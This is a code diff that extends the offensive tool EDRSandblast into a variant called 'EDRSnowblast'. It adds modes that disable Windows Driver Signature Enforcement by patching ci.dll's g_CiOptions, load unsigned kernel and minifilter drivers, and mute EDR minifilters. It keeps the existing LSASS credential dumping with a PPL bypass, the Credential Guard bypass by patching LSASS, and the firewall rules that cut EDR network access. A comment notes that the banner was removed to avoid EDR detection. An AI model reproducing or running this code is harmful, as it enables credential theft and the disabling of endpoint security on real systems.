@@ -6,6 +6,7 @@
 #include <shlwapi.h>
 #include <time.h>
 
+
 #ifdef _DEBUG
 #include <assert.h>
 #endif
@@ -27,8 +28,12 @@
 #include "Undoc.h"
 #include "UserlandHooks.h"
 #include "WdigestOffsets.h"
-
+#include "CiOffsets.h"
+#include "KernelDSE.h"
+#include "FltmgrOffsets.h"
 #include "../EDRSandblast/EDRSandblast.h"
+
+#pragma comment(lib, "fltlib.lib")
 
 typedef NTSTATUS(NTAPI* NtQueryInformationProcess_f)(
     HANDLE          ProcessHandle,
@@ -39,15 +44,18 @@ typedef NTSTATUS(NTAPI* NtQueryInformationProcess_f)(
     );
 
 void PrintBanner() {
-    const TCHAR edrsandblast[] = TEXT("  ______ _____  _____   _____                 _ _     _           _   \r\n |  ____|  __ \\|  __ \\ / ____|               | | |   | |         | |  \r\n | |__  | |  | | |__) | (___   __ _ _ __   __| | |__ | | __ _ ___| |_ \r\n |  __| | |  | |  _  / \\___ \\ / _` | \'_ \\ / _` | \'_ \\| |/ _` / __| __|\r\n | |____| |__| | | \\ \\ ____) | (_| | | | | (_| | |_) | | (_| \\__ | |_ \r\n |______|_____/|_|  \\_|_____/ \\__,_|_| |_|\\__,_|_.__/|_|\\__,_|___/\\__|\n");   
-    const TCHAR defcon[] = TEXT("D3FC0N 30 Edition");
+    const TCHAR edrsnowblast[] = TEXT("  _   _    _    __\r\n |_  | \\  |_)  (_   ._    _         |_   |   _.   _  _|_\r\n |_  |_/  | \\  __)  | |  (_)  \\/\\/  |_)  |  (_|  _>   |_\r\n");
+    const TCHAR snowVersion[] = TEXT("OCD 202308 Edition");
     const TCHAR authors[2][256] = { TEXT("Thomas DIOT (@_Qazeer)"), TEXT("Maxime MEIGNAN (@th3m4ks)") };
+    const TCHAR snowauthor[] = TEXT("by @Vikingfr");
     
     srand(time(NULL));
     int r = rand() % 2;
 
-    _putts_or_not(edrsandblast);
-    _tprintf_or_not(TEXT("  %s | %s & %s\n\n"), defcon, authors[r], authors[(r + 1) % 2]);
+    //comment this out because EDR flag based on it :-o
+    _putts_or_not(edrsnowblast);
+    _tprintf_or_not(TEXT("  %s | %s \n\n"), snowVersion, snowauthor);
+    _tprintf_or_not(TEXT("  [ This tool is a custom version of EDRSandblast from %s & %s ]\n\n"), authors[r], authors[(r + 1) % 2]);
 }
 
 BOOL WasRestarted() {
@@ -74,7 +82,7 @@ BOOL WasRestarted() {
 
 int _tmain(int argc, TCHAR** argv) {
     // Parse command line arguments and initialize variables to default values if needed.
-    const TCHAR usage[] = TEXT("Usage: EDRSandblast.exe [-h | --help] [-v | --verbose] <audit | dump | cmd | credguard | firewall> [--usermode [--unhook-method <N>] [--direct-syscalls]] [--kernelmode] [--dont-unload-driver] [--no-restore] [--driver <RTCore64.sys>] [--service <SERVICE_NAME>] [--nt-offsets <NtoskrnlOffsets.csv>] [--wdigest-offsets <WdigestOffsets.csv>] [--add-dll <dll name or path>]* [-o | --dump-output <DUMP_FILE>]");
+    const TCHAR usage[] = TEXT("Usage: EDRSnowblast.exe [-h | --help] [-v | --verbose] <action mode> [option]");
     const TCHAR extendedUsage[] = TEXT("\n\
 -h | --help             Show this help message and exit.\n\
 -v | --verbose          Enable a more verbose output.\n\
@@ -88,6 +96,10 @@ Actions mode:\n\
 \tcredguard       Patch the LSASS process' memory to enable Wdigest cleartext passwords caching even if\n\
 \t                Credential Guard is enabled on the host. No kernel-land actions required.\n\
 \tfirewall        Add Windows firewall rules to block network access for the EDR processes / services.\n\
+\tloadk           Load unsigned kernel driver. This mode implements the 'sc create [service name] [binPath=evil.sys] + sc start [service name] ' command.\n\
+\tloadf           Load unsigned minifilter driver. This mode implements the 'fltmc load [ driverName ]' command.\n\
+\tfilter-enum     Lists all filter manager frames and attached minifilter drivers (idem Windbg !fltkd.frames).\n\
+\tfilter-mute     Set MaxConnections to zero for the specified driver .\n\
 \n\
 --usermode              Perform user-land operations (DLL unhooking).\n\
 --kernelmode            Perform kernel-land operations (Kernel callbacks removal and ETW TI disabling).\n\
@@ -119,6 +131,11 @@ Other options:\n\
 \n\
 --driver <RTCore64.sys>                 Path to the Micro-Star MSI Afterburner vulnerable driver file.\n\
                                         Default to 'RTCore64.sys' in the current directory.\n\
+--loadk-file <evil.sys>     Require action mode \"loadk\". You must specify the path to the unsigned kernel driver file.\n\
+                                        Default to 'evil.sys' in the current directory.\n\
+--loadf-name <myevil>       Require action mode \"loadf\". You must specify the name of the unsigned minifilter driver.\n\
+                                        Default driver name is 'myevil' .\n\
+--filter-index <N>                      The filter index you want to investigate.\n\
 --service <SERVICE_NAME>                Name of the vulnerable service to intall / start.\n\
 \n\
 --nt-offsets <NtoskrnlOffsets.csv>      Path to the CSV file containing the required ntoskrnl.exe's offsets.\n\
@@ -126,6 +143,12 @@ Other options:\n\
 --wdigest-offsets <WdigestOffsets.csv>  Path to the CSV file containing the required wdigest.dll's offsets\n\
                                         (only for the 'credguard' mode).\n\
                                         Default to 'WdigestOffsets.csv' in the current directory.\n\
+--ci-offsets <CiOffsets.csv>            Path to the CSV file containing the required ci.dll's offsets\n\
+                                        (only for the 'load' mode).\n\
+                                        Default to 'CiOffsets.csv' in the current directory.\n\
+--fltmgr-offsets <FltmgrOffsets.csv>    Path to the CSV file containing the required fltmgr.sys's offsets\n\
+                                        (only for the 'mute' mode).\n\
+                                        Default to 'FltmgrOffsets.csv' in the current directory.\n\
 \n\
 --add-dll <dll name or path>            Loads arbitrary libraries into the process' address space, before starting\n\
                                         anything. This can be useful to audit userland hooking for DLL that are not\n\
@@ -145,7 +168,7 @@ Other options:\n\
     HRESULT hrStatus = S_OK;
     TCHAR currentFolderPath[MAX_PATH] = { 0 };
     GetCurrentDirectory(_countof(currentFolderPath), currentFolderPath);
-
+    //PrintBanner();
     if (argc < 2) {
         _tprintf_or_not(TEXT("%s"), usage);
         return EXIT_FAILURE;
@@ -153,9 +176,15 @@ Other options:\n\
 
     START_MODE startMode = none;
     TCHAR driverPath[MAX_PATH] = { 0 };
+    TCHAR unsignedDriverPath[MAX_PATH] = { 0 };
+    WCHAR unsignedMinifilterDriverName[MAX_PATH] = { 0 };
     TCHAR driverDefaultName[] = DEFAULT_DRIVER_FILE;
+    TCHAR evilDriverDefaultName[] = DEFAULT_EVIL_DRIVER_FILE;
+    WCHAR evilMinidriverDefaultName[] = DEFAULT_EVIL_MINIDRIVER_NAME;
     TCHAR ntoskrnlOffsetCSVPath[MAX_PATH] = { 0 };
     TCHAR wdigestOffsetCSVPath[MAX_PATH] = { 0 };
+    TCHAR CiOffsetCSVPath[MAX_PATH] = { 0 };
+    TCHAR fltmgrOffsetCSVPath[MAX_PATH] = { 0 };
     TCHAR processName[] = TEXT("lsass.exe");
     TCHAR outputPath[MAX_PATH] = { 0 };
     BOOL verbose = FALSE;
@@ -163,6 +192,8 @@ Other options:\n\
     BOOL restoreCallbacks = TRUE;
     BOOL userMode = FALSE;
     BOOL internet = FALSE;
+    BOOL isMinifilterDriver = FALSE;
+    BOOL isKernelDriver = FALSE;
     enum UNHOOK_METHOD_e unhook_method = UNHOOK_WITH_NTPROTECTVIRTUALMEMORY;
     BOOL directSyscalls = FALSE;
     BOOL kernelMode = FALSE;
@@ -172,6 +203,7 @@ Other options:\n\
     BOOL foundNotifyRoutineCallbacks = FALSE;
     BOOL foundObjectCallbacks = FALSE;
     HOOK* hooks = NULL;
+    int filter_index = -1;
     //TODO implement a "force" mode : remove notify routines & object callbacks without checking if it belongs to an EDR (useful as a last resort if a driver is not recognized)
 
 
@@ -191,6 +223,22 @@ Other options:\n\
         else if (_tcsicmp(argv[i], TEXT("firewall")) == 0) {
             startMode = firewall;
         }
+        else if (_tcsicmp(argv[i], TEXT("loadk")) == 0) {
+            startMode = load;
+            isKernelDriver = TRUE;
+            isMinifilterDriver = FALSE;
+        }
+        else if (_tcsicmp(argv[i], TEXT("loadf")) == 0) {
+            startMode = load;
+            isKernelDriver = FALSE;
+            isMinifilterDriver = TRUE;
+        }
+        else if (_tcsicmp(argv[i], TEXT("filter-mute")) == 0) {
+            startMode = mute;
+        }
+        else if (_tcsicmp(argv[i], TEXT("filter-enum")) == 0) {
+            startMode = fltkd_frames;
+        }
         else if (_tcsicmp(argv[i], TEXT("-h")) == 0 || _tcsicmp(argv[i], TEXT("--help")) == 0) {
             _putts_or_not(usage);
             _putts_or_not(extendedUsage);
@@ -203,6 +251,9 @@ Other options:\n\
             userMode = TRUE;
         }
         else if (_tcsicmp(argv[i], TEXT("--kernelmode")) == 0) {
+            kernelMode = TRUE;
+        }
+        else if (_tcsicmp(argv[i], TEXT("-k")) == 0) {
             kernelMode = TRUE;
         }
         else if (_tcsicmp(argv[i], TEXT("--dont-unload-driver")) == 0) {
@@ -218,6 +269,22 @@ Other options:\n\
                 return EXIT_FAILURE;
             }
             _tcsncpy_s(driverPath, _countof(driverPath), argv[i], _tcslen(argv[i]));
+        }
+        else if (_tcsicmp(argv[i], TEXT("--loadk-file")) == 0) {
+            i++;
+            if (i > argc) {
+                _tprintf_or_not(TEXT("%s"), usage);
+                return EXIT_FAILURE;
+            }
+            _tcsncpy_s(unsignedDriverPath, _countof(unsignedDriverPath), argv[i], _tcslen(argv[i]));
+        }
+        else if (_tcsicmp(argv[i], TEXT("--loadf-name")) == 0) {
+            i++;
+            if (i > argc) {
+                _tprintf_or_not(TEXT("%s"), usage);
+                return EXIT_FAILURE;
+            }
+            _tcsncpy_s(unsignedMinifilterDriverName, _countof(unsignedMinifilterDriverName), argv[i], _tcslen(argv[i]));
         }
         else if (_tcsicmp(argv[i], TEXT("--service")) == 0) {
             i++;
@@ -243,6 +310,22 @@ Other options:\n\
             }
             _tcsncpy_s(wdigestOffsetCSVPath, _countof(wdigestOffsetCSVPath), argv[i], _tcslen(argv[i]));
         }
+        else if (_tcsicmp(argv[i], TEXT("--ci-offsets")) == 0) {
+            i++;
+            if (i > argc) {
+                _tprintf_or_not(TEXT("%s"), usage);
+                return EXIT_FAILURE;
+            }
+            _tcsncpy_s(CiOffsetCSVPath, _countof(CiOffsetCSVPath), argv[i], _tcslen(argv[i]));
+        }
+        else if (_tcsicmp(argv[i], TEXT("--fltmgr-offsets")) == 0) {
+        i++;
+        if (i > argc) {
+            _tprintf_or_not(TEXT("%s"), usage);
+            return EXIT_FAILURE;
+        }
+        _tcsncpy_s(fltmgrOffsetCSVPath, _countof(fltmgrOffsetCSVPath), argv[i], _tcslen(argv[i]));
+        }
         else if (_tcsicmp(argv[i], TEXT("-o")) == 0 || _tcsicmp(argv[i], TEXT("--dump-output")) == 0) {
             i++;
             if (i > argc) {
@@ -266,6 +349,14 @@ Other options:\n\
                 return EXIT_FAILURE;
             }
             unhook_method = _ttoi(argv[i]);
+        }
+        else if (_tcsicmp(argv[i], TEXT("--filter-index")) == 0) {
+        i++;
+        if (i > argc) {
+            _tprintf_or_not(TEXT("%s"), usage);
+            return EXIT_FAILURE;
+        }
+        filter_index = _ttoi(argv[i]);
         }
         else if (_tcsicmp(argv[i], TEXT("--direct-syscalls")) == 0) {
             directSyscalls = TRUE;
@@ -320,7 +411,18 @@ Other options:\n\
     if (startMode == dump && !kernelMode) {
         _putts_or_not(TEXT("[!] LSASS dump might fail if RunAsPPL is enabled. Enable --kernelmode to bypass PPL\n"));
     }
-
+    if (startMode == load && !kernelMode) {
+        _putts_or_not(TEXT("'loadk and loadf' modes need kernel-land DSE disabling operation to work, please enable --kernelmode"));
+        return EXIT_FAILURE;
+    }
+    if (startMode == mute && !kernelMode) {
+        _putts_or_not(TEXT("'filter-mute' mode needs kernel-land operation to work, please enable --kernelmode"));
+        return EXIT_FAILURE;
+    }
+    if (startMode == fltkd_frames && !kernelMode) {
+        _putts_or_not(TEXT("'filter-enum' mode needs kernel-land operation to work, please enable --kernelmode"));
+        return EXIT_FAILURE;
+    }
     // TODO: set isSafeToExecutePayloadUserland by unhook to TRUE / FALSE if there are still hooks.
     BOOL isSafeToExecutePayloadUserland = TRUE;
     BOOL isSafeToExecutePayloadKernelland = TRUE;
@@ -465,172 +567,424 @@ Other options:\n\
             // Do the operation the tool was started for.
             switch (startMode) {
 
-            // Start a process executing cmd.exe.
-            case cmd:
-                _putts_or_not(TEXT("[+] Kernel callbacks have normally been removed, starting cmd.exe\n")
-                    TEXT("WARNING: EDR kernel callbacks will be restored after exiting the cmd prompt (by typing exit)\n")
-                    TEXT("WARNING: While unlikely, the longer the callbacks are removed, the higher the chance of being detected / causing a BSoD upon restore is!\n"));
-                // Find cmd.exe path.
-                TCHAR systemDirectory[MAX_PATH] = { 0 };
-                GetSystemDirectory(systemDirectory, _countof(systemDirectory));
-                TCHAR cmdPath[MAX_PATH] = { 0 };
-                _tcscat_s(cmdPath, _countof(cmdPath), systemDirectory);
-                _tcscat_s(cmdPath, _countof(cmdPath), TEXT("\\cmd.exe"));
-                _tsystem(cmdPath);
-                break;
+                // Start a process executing cmd.exe.
+                case cmd:
+                    _putts_or_not(TEXT("[+] Kernel callbacks have normally been removed, starting cmd.exe\n")
+                        TEXT("WARNING: EDR kernel callbacks will be restored after exiting the cmd prompt (by typing exit)\n")
+                        TEXT("WARNING: While unlikely, the longer the callbacks are removed, the higher the chance of being detected / causing a BSoD upon restore is!\n"));
+                    // Find cmd.exe path.
+                    TCHAR systemDirectory[MAX_PATH] = { 0 };
+                    GetSystemDirectory(systemDirectory, _countof(systemDirectory));
+                    TCHAR cmdPath[MAX_PATH] = { 0 };
+                    _tcscat_s(cmdPath, _countof(cmdPath), systemDirectory);
+                    _tcscat_s(cmdPath, _countof(cmdPath), TEXT("\\cmd.exe"));
+                    _tsystem(cmdPath);
+                    break;
 
-            // Dump the LSASS process in a new thread.
-            case dump:
-                if (kernelMode) {
-                    if (g_ntoskrnlOffsets.st.eprocess_protection != 0x0) {
-                        _putts_or_not(TEXT("\n[+] RunPPL bypass: Self protect our current process as Light WinTcb(PsProtectedSignerWinTcb - Light) since PPL is supported by the OS. This will allow access to LSASS if RunAsPPL is enabled"));
-                        SetCurrentProcessAsProtected(verbose);
+                // Dump the LSASS process in a new thread.
+                case dump:
+                    if (kernelMode) {
+                        if (g_ntoskrnlOffsets.st.eprocess_protection != 0x0) {
+                            _putts_or_not(TEXT("\n[+] RunPPL bypass: Self protect our current process as Light WinTcb(PsProtectedSignerWinTcb - Light) since PPL is supported by the OS. This will allow access to LSASS if RunAsPPL is enabled"));
+                            SetCurrentProcessAsProtected(verbose);
+                        }
                     }
-                }
 
-                _putts_or_not(TEXT("[+] Attempting to dump the process"));
+                    _putts_or_not(TEXT("[+] Attempting to dump the process"));
 
-                // Determine dump path based on specified process name.
-                if (_tcslen(outputPath) == 0) {
-                    TCHAR* processNameFilename = _tcsdup(processName);
-                    PathRemoveExtension(processNameFilename);
-                    _tcscat_s(outputPath, _countof(outputPath), currentFolderPath);
-                    _tcscat_s(outputPath, _countof(outputPath), TEXT("\\"));
-                    _tcscat_s(outputPath, _countof(outputPath), processNameFilename);
-                    if (processNameFilename) {
-                        free(processNameFilename);
-                        processNameFilename = NULL;
+                    // Determine dump path based on specified process name.
+                    if (_tcslen(outputPath) == 0) {
+                        TCHAR* processNameFilename = _tcsdup(processName);
+                        PathRemoveExtension(processNameFilename);
+                        _tcscat_s(outputPath, _countof(outputPath), currentFolderPath);
+                        _tcscat_s(outputPath, _countof(outputPath), TEXT("\\"));
+                        _tcscat_s(outputPath, _countof(outputPath), processNameFilename);
+                        if (processNameFilename) {
+                            free(processNameFilename);
+                            processNameFilename = NULL;
+                        }
                     }
-                }
-                else if (PathIsRelative(outputPath)) {
-                    SIZE_T newOutputPathsZ = _tcslen(currentFolderPath) + _tcslen(TEXT("\\")) + _tcslen(outputPath) + 1;
-                    TCHAR* newOutputPath = calloc(newOutputPathsZ, sizeof(TCHAR));
-                    if (!newOutputPath) {
+                    else if (PathIsRelative(outputPath)) {
+                        SIZE_T newOutputPathsZ = _tcslen(currentFolderPath) + _tcslen(TEXT("\\")) + _tcslen(outputPath) + 1;
+                        TCHAR* newOutputPath = calloc(newOutputPathsZ, sizeof(TCHAR));
+                        if (!newOutputPath) {
+                            _putts_or_not(TEXT("[!] A fatal error occurred while allocating memory for thread arguments"));
+                            lpExitCode = EXIT_FAILURE;
+                            break;
+                        }
+                        _tcscat_s(newOutputPath, newOutputPathsZ, currentFolderPath);
+                        _tcscat_s(newOutputPath, newOutputPathsZ, TEXT("\\"));
+                        _tcscat_s(newOutputPath, newOutputPathsZ, outputPath);
+                        _tcscpy_s(outputPath, _countof(outputPath), newOutputPath);
+                        if (newOutputPath) {
+                            free(newOutputPath);
+                            newOutputPath = NULL;
+                        }
+                    }
+
+                    HANDLE hThread = NULL;
+
+                    // Set arguments for function call through 
+                    PVOID* pThreatArguments = calloc(2, sizeof(PVOID));
+                    if (!pThreatArguments) {
                         _putts_or_not(TEXT("[!] A fatal error occurred while allocating memory for thread arguments"));
                         lpExitCode = EXIT_FAILURE;
                         break;
                     }
-                    _tcscat_s(newOutputPath, newOutputPathsZ, currentFolderPath);
-                    _tcscat_s(newOutputPath, newOutputPathsZ, TEXT("\\"));
-                    _tcscat_s(newOutputPath, newOutputPathsZ, outputPath);
-                    _tcscpy_s(outputPath, _countof(outputPath), newOutputPath);
-                    if (newOutputPath) {
-                        free(newOutputPath);
-                        newOutputPath = NULL;
+                    pThreatArguments[0] = processName;
+                    pThreatArguments[1] = outputPath;
+
+                    if (directSyscalls) {
+                        hThread = CreateThread(NULL, 0, SandMiniDumpWriteDumpFromThread, (PVOID) pThreatArguments, 0, NULL);
                     }
-                }
+                    else {
+                        hThread = CreateThread(NULL, 0, dumpProcessFromThread, (PVOID) pThreatArguments, 0, NULL);
+                    }
+                    if (hThread) {
+                        WaitForSingleObject(hThread, INFINITE);
+                        GetExitCodeThread(hThread, (PDWORD)&lpExitCode);
+                        if (lpExitCode != 0) {
+                            _putts_or_not(TEXT("[!] A fatal error occurred during the LSASS dump / execution of cmd.exe"));
+                            lpExitCode = EXIT_FAILURE;
+                        }
+                    }
+                    else {
+                        _putts_or_not(TEXT("[!] An error occurred while attempting to start the new thread..."));
+                        lpExitCode = EXIT_FAILURE;
+                    }
+                    if (pThreatArguments) {
+                        free(pThreatArguments);
+                        pThreatArguments = NULL;
+                    }
+                    break;
 
-                HANDLE hThread = NULL;
+                // Bypass Cred Guard (for new logins) by patching LSASS's wdigest module in memory.
+                case credguard:
+                    if (_tcslen(wdigestOffsetCSVPath) == 0) {
+                        TCHAR offsetCSVName[] = TEXT("\\WdigestOffsets.csv");
+                        _tcsncat_s(wdigestOffsetCSVPath, _countof(wdigestOffsetCSVPath), currentFolderPath, _countof(currentFolderPath));
+                        _tcsncat_s(wdigestOffsetCSVPath, _countof(wdigestOffsetCSVPath), offsetCSVName, _countof(offsetCSVName));
+                    }
 
-                // Set arguments for function call through 
-                PVOID* pThreatArguments = calloc(2, sizeof(PVOID));
-                if (!pThreatArguments) {
-                    _putts_or_not(TEXT("[!] A fatal error occurred while allocating memory for thread arguments"));
-                    lpExitCode = EXIT_FAILURE;
+                    if (FileExists(wdigestOffsetCSVPath)) {
+                        _putts_or_not(TEXT("[+] Loading wdigest related offsets from the CSV file"));
+                        LoadWdigestOffsetsFromFile(wdigestOffsetCSVPath);
+                        if (g_wdigestOffsets.st.g_fParameter_UseLogonCredential == 0x0 || g_wdigestOffsets.st.g_IsCredGuardEnabled == 0x0) {
+                            _putts_or_not(TEXT("[!] Offsets are missing from the CSV for the version of wdigest in use."));
+                        }
+                    }
+                    if (internet && (g_wdigestOffsets.st.g_fParameter_UseLogonCredential == 0x0 || g_wdigestOffsets.st.g_IsCredGuardEnabled == 0x0)) {
+                        _putts_or_not(TEXT("[+] Downloading wdigest related offsets from the MS Symbol Server (will drop a .pdb file in current directory)"));
+    #if _DEBUG
+                        LoadWdigestOffsetsFromInternet(FALSE);
+    #else
+                        LoadWdigestOffsetsFromInternet(TRUE);
+    #endif
+                        if (g_wdigestOffsets.st.g_fParameter_UseLogonCredential == 0x0 || g_wdigestOffsets.st.g_IsCredGuardEnabled == 0x0) {
+                            _putts_or_not(TEXT("[-] Downloading offsets from the internet failed !"));
+
+                        }
+                        else {
+                            _putts_or_not(TEXT("[+] Downloading offsets succeeded !"));
+                            if (FileExists(wdigestOffsetCSVPath)) {
+                                _putts_or_not(TEXT("[+] Saving them to the CSV file..."));
+                                SaveWdigestOffsetsToFile(wdigestOffsetCSVPath);
+                            }
+                        }
+                    }
+                    if (g_wdigestOffsets.st.g_fParameter_UseLogonCredential == 0x0 || g_wdigestOffsets.st.g_IsCredGuardEnabled == 0x0) {
+                        _putts_or_not(TEXT("[!] The offsets must be computed using the provided script and added to the offsets CSV file. LSASS won't be patched...\n"));
+                        lpExitCode = EXIT_FAILURE;
+                    }
+                    else {
+                        _putts_or_not(TEXT(""));
+                        if (kernelMode) {
+                            _putts_or_not(TEXT("[+] Self protect our current process as Light WinTcb(PsProtectedSignerWinTcb - Light) if PPL are supported by the OS(Offset of _PS_PROTECTION exists). This will allow lsass access is RunAsPPL is enabled"));
+                            if (g_ntoskrnlOffsets.st.eprocess_protection != 0x0) {
+                                SetCurrentProcessAsProtected(verbose);
+                            }
+                        }
+                        if (disableCredGuardByPatchingLSASS()) {
+                            _putts_or_not(TEXT("[+] LSASS was patched and Credential Guard should be bypassed for future logins on the system."));
+                        }
+                        else {
+                            _putts_or_not(TEXT("[!] LSASS couldn't be patched and Credential Guard will not be bypassed."));
+                            lpExitCode = EXIT_FAILURE;
+                        }
+                    }
+                    break;
+
+                // Add firewall rules to block EDR network communications.
+                case firewall:
+                {
+                    hrStatus = S_OK;
+                    fwBlockingRulesList sFWEntries = { 0 };
+
+                    _tprintf_or_not(TEXT("[*] Configuring Windows Firewall rules to block EDR network access...\n"));
+                    hrStatus = FirewallBlockEDR(&sFWEntries);
+                    if (FAILED(hrStatus)) {
+                        _tprintf_or_not(TEXT("[!] An error occured while attempting to create Firewall rules!\n"));
+                    }
+                    else {
+                        _tprintf_or_not(TEXT("[+] Successfully configured Windows Firewall rules to block EDR network access!\n"));
+
+                    }
+                    _tprintf_or_not(TEXT("\n"));
+                    FirewallPrintManualDeletion(&sFWEntries);
                     break;
                 }
-                pThreatArguments[0] = processName;
-                pThreatArguments[1] = outputPath;
-
-                if (directSyscalls) {
-                    hThread = CreateThread(NULL, 0, SandMiniDumpWriteDumpFromThread, (PVOID) pThreatArguments, 0, NULL);
-                }
-                else {
-                    hThread = CreateThread(NULL, 0, dumpProcessFromThread, (PVOID) pThreatArguments, 0, NULL);
-                }
-                if (hThread) {
-                    WaitForSingleObject(hThread, INFINITE);
-                    GetExitCodeThread(hThread, (PDWORD)&lpExitCode);
-                    if (lpExitCode != 0) {
-                        _putts_or_not(TEXT("[!] A fatal error occurred during the LSASS dump / execution of cmd.exe"));
-                        lpExitCode = EXIT_FAILURE;
+                // Load an unsigned kernel driver.
+                case load:
+                {
+                    if (_tcslen(CiOffsetCSVPath) == 0) {
+                        TCHAR CiOffsetCSVName[] = TEXT("\\CiOffsets.csv");
+                        _tcsncat_s(CiOffsetCSVPath, _countof(CiOffsetCSVPath), currentFolderPath, _countof(currentFolderPath));
+                        _tcsncat_s(CiOffsetCSVPath, _countof(CiOffsetCSVPath), CiOffsetCSVName, _countof(CiOffsetCSVName));
                     }
-                }
-                else {
-                    _putts_or_not(TEXT("[!] An error occurred while attempting to start the new thread..."));
-                    lpExitCode = EXIT_FAILURE;
-                }
-                if (pThreatArguments) {
-                    free(pThreatArguments);
-                    pThreatArguments = NULL;
-                }
-                break;
 
-            // Bypass Cred Guard (for new logins) by patching LSASS's wdigest module in memory.
-            case credguard:
-                if (_tcslen(wdigestOffsetCSVPath) == 0) {
-                    TCHAR offsetCSVName[] = TEXT("\\WdigestOffsets.csv");
-                    _tcsncat_s(wdigestOffsetCSVPath, _countof(wdigestOffsetCSVPath), currentFolderPath, _countof(currentFolderPath));
-                    _tcsncat_s(wdigestOffsetCSVPath, _countof(wdigestOffsetCSVPath), offsetCSVName, _countof(offsetCSVName));
-                }
-
-                if (FileExists(wdigestOffsetCSVPath)) {
-                    _putts_or_not(TEXT("[+] Loading wdigest related offsets from the CSV file"));
-                    LoadWdigestOffsetsFromFile(wdigestOffsetCSVPath);
-                    if (g_wdigestOffsets.st.g_fParameter_UseLogonCredential == 0x0 || g_wdigestOffsets.st.g_IsCredGuardEnabled == 0x0) {
-                        _putts_or_not(TEXT("[!] Offsets are missing from the CSV for the version of wdigest in use."));
-                    }
-                }
-                if (internet && (g_wdigestOffsets.st.g_fParameter_UseLogonCredential == 0x0 || g_wdigestOffsets.st.g_IsCredGuardEnabled == 0x0)) {
-                    _putts_or_not(TEXT("[+] Downloading wdigest related offsets from the MS Symbol Server (will drop a .pdb file in current directory)"));
-#if _DEBUG
-                    LoadWdigestOffsetsFromInternet(FALSE);
-#else
-                    LoadWdigestOffsetsFromInternet(TRUE);
-#endif
-                    if (g_wdigestOffsets.st.g_fParameter_UseLogonCredential == 0x0 || g_wdigestOffsets.st.g_IsCredGuardEnabled == 0x0) {
-                        _putts_or_not(TEXT("[-] Downloading offsets from the internet failed !"));
-
-                    }
-                    else {
-                        _putts_or_not(TEXT("[+] Downloading offsets succeeded !"));
-                        if (FileExists(wdigestOffsetCSVPath)) {
-                            _putts_or_not(TEXT("[+] Saving them to the CSV file..."));
-                            SaveWdigestOffsetsToFile(wdigestOffsetCSVPath);
+                    if (FileExists(CiOffsetCSVPath)) {
+                        LoadCiOffsetsFromFile(CiOffsetCSVPath, verbose);
+                        if (g_ciOffsets.st.g_CiOptions == 0x0) {
+                            _putts_or_not(TEXT("[!] Offsets are missing from the CSV for the version of ci in use."));
+                        }
+                        else {
+                            if (verbose) {
+                                _tprintf_or_not(TEXT("[+] g_CiOptions offset found using %s file : 0x%llx\n"), CiOffsetCSVPath, g_ciOffsets.st.g_CiOptions);
+                            }
                         }
                     }
-                }
-                if (g_wdigestOffsets.st.g_fParameter_UseLogonCredential == 0x0 || g_wdigestOffsets.st.g_IsCredGuardEnabled == 0x0) {
-                    _putts_or_not(TEXT("[!] The offsets must be computed using the provided script and added to the offsets CSV file. LSASS won't be patched...\n"));
-                    lpExitCode = EXIT_FAILURE;
-                }
-                else {
-                    _putts_or_not(TEXT(""));
-                    if (kernelMode) {
-                        _putts_or_not(TEXT("[+] Self protect our current process as Light WinTcb(PsProtectedSignerWinTcb - Light) if PPL are supported by the OS(Offset of _PS_PROTECTION exists). This will allow lsass access is RunAsPPL is enabled"));
-                        if (g_ntoskrnlOffsets.st.eprocess_protection != 0x0) {
-                            SetCurrentProcessAsProtected(verbose);
+
+                    if (internet && (g_ciOffsets.st.g_CiOptions == 0x0)) {
+                        _putts_or_not(TEXT("[+] Downloading ci related offsets from the MS Symbol Server (will drop a .pdb file in current directory)"));
+    #if _DEBUG
+                        LoadCiOffsetsFromInternet(FALSE);
+    #else
+                        LoadCiOffsetsFromInternet(TRUE);
+    #endif
+                        if (g_ciOffsets.st.g_CiOptions == 0x0) {
+                            _putts_or_not(TEXT("[-] Downloading offsets from the internet failed !"));
+
+                        }
+                        else {
+                            _putts_or_not(TEXT("[+] Downloading offsets succeeded !"));
+                            if (FileExists(CiOffsetCSVPath)) {
+                                _putts_or_not(TEXT("[+] Saving them to the CSV file..."));
+                                SaveCiOffsetsToFile(CiOffsetCSVPath);
+                            }
+                        }
+                        if (verbose) {
+                            _tprintf_or_not(TEXT("[+] g_CiOptions offset found using internet MS Symbol Server : 0x%llx\n"), g_ciOffsets.st.g_CiOptions);
                         }
                     }
-                    if (disableCredGuardByPatchingLSASS()) {
-                        _putts_or_not(TEXT("[+] LSASS was patched and Credential Guard should be bypassed for future logins on the system."));
-                    }
-                    else {
-                        _putts_or_not(TEXT("[!] LSASS couldn't be patched and Credential Guard will not be bypassed."));
+
+                    if (g_ciOffsets.st.g_CiOptions == 0x0) {
+                        _putts_or_not(TEXT("[!] The offsets must be computed using the provided script and added to the offsets CSV file (or use --internet).\nUnsigned driver won't be loaded ...\n"));
                         lpExitCode = EXIT_FAILURE;
                     }
+                    else {
+                        _putts_or_not(TEXT("[+] The ci.dll offsets are available, we can now patch DSE in order to load unsigned driver..."));
+                        if (kernelMode) {
+                            DWORD64 CiBaseAddress = 0;
+                            DWORD64 g_CiOptionsAddress = 0;
+                            if (!IsCiEnabled())
+                            {
+                                _putts_or_not(TEXT("[!] CI is already disabled!\n")); // debug print
+                            }
+                            CiBaseAddress = FindCIBaseAddress(verbose);
+                            if (!CiBaseAddress) {
+                                _putts_or_not(TEXT("[-] CI base address not found !\n"));
+                            }
+                            else{
+                                g_CiOptionsAddress=CiBaseAddress + g_ciOffsets.st.g_CiOptions;
+                                if (verbose)
+                                    _tprintf_or_not(TEXT("[+] CI.dll kernel base address found at 0x%llx. The g_CiOptions is at %llx !\n"), CiBaseAddress, g_CiOptionsAddress);
+                                // Disable DSE
+                                ULONG CiOptionsValue = 0;
+                                ULONG OldCiOptionsValue;
+                                patch_gCiOptions(g_CiOptionsAddress, CiOptionsValue, &OldCiOptionsValue);
+                                // Load the unsigned driver
+                                if (isMinifilterDriver) {
+                                    // load MINIFILTER driver
+                                    if (_tcslen(unsignedMinifilterDriverName) == 0) {
+                                        PathAppend(unsignedMinifilterDriverName, evilMinidriverDefaultName);
+                                    }
+                                    _tprintf_or_not(TEXT("[+] Starting unsigned minifilter driver \"%s\"...\n"), unsignedMinifilterDriverName);
+                                    HRESULT fltLoadResult = startFlt(unsignedMinifilterDriverName);
+                                    if (fltLoadResult == 0x80070420) {
+                                        _tprintf_or_not(TEXT("[!] The minifilter driver \"%s\" is already started\n"), unsignedMinifilterDriverName);
